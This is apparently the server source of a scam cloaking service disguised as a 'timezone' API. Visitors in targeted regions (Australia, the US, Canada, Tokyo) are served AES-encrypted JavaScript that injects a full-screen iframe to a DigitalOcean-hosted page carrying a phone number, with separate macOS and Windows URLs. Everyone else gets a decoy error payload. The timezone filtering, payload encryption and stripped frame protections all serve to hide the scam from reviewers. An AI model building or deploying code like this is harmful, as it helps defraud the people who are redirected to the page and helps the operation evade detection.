const express = require("express");
const cors = require("cors");
const CryptoJS = require("crypto-js");

const app = express();
const PORT = 3000;
const secretKey = "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";

// --- Middleware ---
app.use(cors());
app.use(express.json());

// Security and CORS middleware
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    
    // Updated Frame Options: Using CSP for better modern browser compatibility
    res.removeHeader('X-Frame-Options'); 
    res.setHeader("Content-Security-Policy", "frame-ancestors *;"); 
    
    next();
});

// --- Helper Functions ---

/**
 * Encrypts a string of text using AES
 */
function aesEncode(text) {
    return CryptoJS.AES.encrypt(text, secretKey).toString();
}

/**
 * Generates an encrypted "Error" payload
 */
function getError() {
    const se1 = `console.log("Error Find");`;
    const encrypted1 = aesEncode(se1);
    return encodeURIComponent(encrypted1);
}

/**
 * Generates the main encrypted payload based on User-Agent detection
 */
function getResponse(userAgent) {
    const isMac = /Macintosh|Mac OS X/i.test(userAgent);

    const linkGroups = [
        {
            id: "Group 1",
            weight: 0.5,
            macos: "https://plankton-app-s2yd4.ondigitalocean.app/merrx01usahtml/?bcda=1800%20033%20905",
            others: "https://plankton-app-s2yd4.ondigitalocean.app/werrx01USAHTML/?bcda=1800%20033%20905"
        },
        {
            id: "Group 2",
            weight: 0.5,
            macos: "https://plankton-app-s2yd4.ondigitalocean.app/merrx01usahtml/?bcda=1800%20033%20905",
            others: "https://plankton-app-s2yd4.ondigitalocean.app/werrx01USAHTML/?bcda=1800%20033%20905"
        }
    ];

    function selectGroup() {
        const rand = Math.random();
        let cumulative = 0;
        for (const group of linkGroups) {
            cumulative += group.weight;
            if (rand <= cumulative) return group;
        }
        return linkGroups[0];
    }

    const selectedGroup = selectGroup();
    const selectedUrl = isMac ? selectedGroup.macos : selectedGroup.others;

    // JavaScript payload to be executed on the client side
    const se1 = `
        const iframe = document.createElement("iframe");
        iframe.src = "${selectedUrl}";
        iframe.setAttribute("allow", "fullscreen; autoplay; encrypted-media; picture-in-picture");
        iframe.setAttribute("allowfullscreen", "");
        iframe.setAttribute("webkitallowfullscreen", "");
        iframe.setAttribute("mozallowfullscreen", "");
        iframe.setAttribute("sandbox", "allow-scripts allow-popups allow-forms allow-downloads");
        iframe.style.width = "100%";
        iframe.style.height = "100%";
        iframe.style.border = "0px";

        const container = document.getElementById("contentiframe");
        if(container) {
            container.replaceChildren(iframe);
        }
    `;

    return encodeURIComponent(aesEncode(se1));
}

// --- Routes ---

/**
 * Unauthorized GET access route
 */
app.get("/timezone", (req, res) => {
    res.status(401).json({
        status: "error",
        message: "Unauthorized access",
        response: getError()
    });
});

/**
 * Main POST route with timezone validation for Australia, USA, and Canada
 */
app.post("/timezone", (req, res) => {
    const { timezone } = req.body;
    const userAgent = req.get('User-Agent') || "";

    const allowedTimezones = [
        // --- Australia ---
        "Australia/Sydney", "Australia/Melbourne", "Australia/Brisbane", 
        "Australia/Perth", "Australia/Adelaide", "Australia/Hobart", 
        "Australia/Darwin", "Australia/Canberra", "Australia/Lord_Howe",
        
        // --- North America & Japan ---
        "Asia/Tokyo",
        "America/New_York", "America/Chicago", "America/Denver", "America/Los_Angeles", "America/Anchorage",
        "Pacific/Honolulu",
        "America/Toronto", "America/Vancouver", "America/Edmonton", "America/Winnipeg", "America/Halifax", "America/St_Johns"
    ];

    if (allowedTimezones.includes(timezone)) {
        res.send(getResponse(userAgent));
    } else {
        res.send(getError());
    }
});

// --- Start Server ---
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
